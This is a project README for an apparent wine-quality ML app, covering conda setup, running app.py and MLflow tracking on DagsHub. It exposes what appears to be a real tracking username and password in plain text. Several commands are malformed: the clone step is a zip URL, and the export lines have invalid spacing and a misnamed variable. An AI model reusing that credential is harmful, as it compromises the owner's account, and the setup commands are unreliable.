# Wine-Quality-Tester

## Workflows

1. Update Config.yaml
2. Update schema.yaml
3. Update params.yaml
4. Update entity
5. Update the configuration manager in src config
6. Update Components
7. Update the Pipeline
8. Update the main.py
9. Update the App.py


# How to Run?


### STEPS:

Clone the repository


```bash
https://github.com/ItzmeAkash/Wine-Quality-Tester/raw/main/winequality-data.zip
```

### STEP 01 - Create a conda environment after opening the repository

```bash
conda create -n winetester python=3.8 -y
```

```bash
conda activate winetester
```

### STEP 02 - Install the requirements

```bash
pip install -r requirements.txt
```


```bash
# Finally run the following Command
python app.py
```


Now,
```bash
open up you local host and port
```

## MLflow


[Documentation](https://mlflow.org/docs/latest/index.html)

##### cmd

- mlflow ui

### dagshub

[dagshub](https://dagshub.com/)

MLFLOW_TRACKING_URI=https://dagshub.com/itzmeakashps/Wine-Quality-Tester.mlflow \
MLFLOW_TRACKING_USERNAME=itzmeakashps \
MLFLOW_TRACKING_PASSWORD=d587244e64e62ea9ab9a724d252a21ca83c524fe \
python script.py


Run this to export as env variables

```bash

export MLFLOW_TRACKING_URL=https://dagshub.com/itzmeakashps/Wine-Quality-Tester.mlflow

export MLFLOW_TRACKING_USERNAME = itzmeakashps

export MLFLOW_TRACKING_PASSWORD = d587244e64e62ea9ab9a724d252a21ca83c524fe 

```